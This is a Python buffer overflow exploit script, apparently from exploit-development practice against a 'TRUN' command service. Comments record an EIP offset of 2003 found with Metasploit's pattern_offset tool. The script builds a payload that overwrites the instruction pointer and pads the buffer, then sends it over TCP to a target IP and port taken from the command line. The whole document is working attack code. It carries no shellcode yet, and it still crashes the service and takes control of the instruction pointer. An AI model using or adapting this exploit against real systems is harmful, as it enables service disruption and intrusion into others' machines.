import argparse
import socket
import subprocess
import sys

# EIP 386F4337
#/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 5000 -q 386F4337
#[*] Exact match at offset 2003

cmd = "TRUN /.:/"
offset = "A" * 2003
overwrite_eip = "BCDE"
payload = cmd + offset + overwrite_eip
# Calculation of the remaining size of the buffer
payload +=((5000 -len(offset) -len(overwrite_eip)) * "C")

class Buffer():
    def __init__(self,TCP_IP, TCP_PORT):
        self.TCP_IP = TCP_IP
        self.TCP_PORT = TCP_PORT

    def oscmd(self, cmd):
        p = subprocess.Popen(
            cmd, shell=False,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = p.communicate()
        return stdout.decode(), stderr.decode()

    def send_buffer(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.TCP_IP, self.TCP_PORT))
            s.send((payload.encode('utf8')))
            s.close()
        except:
            print("Error Connection the server")
            sys.exit()

    def run(self):
        try:
            self.send_buffer()
        except Exception as e:
            print(e)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('TCP_IP', type=str, help='Specify IP of the target: e.g. 192.168.1.X')
    parser.add_argument('TCP_PORT', type=int, help='Specify Port of the target: e.g. 443')
    args = parser.parse_args()
    sm = Buffer(args.TCP_IP, args.TCP_PORT)
    sm.run()
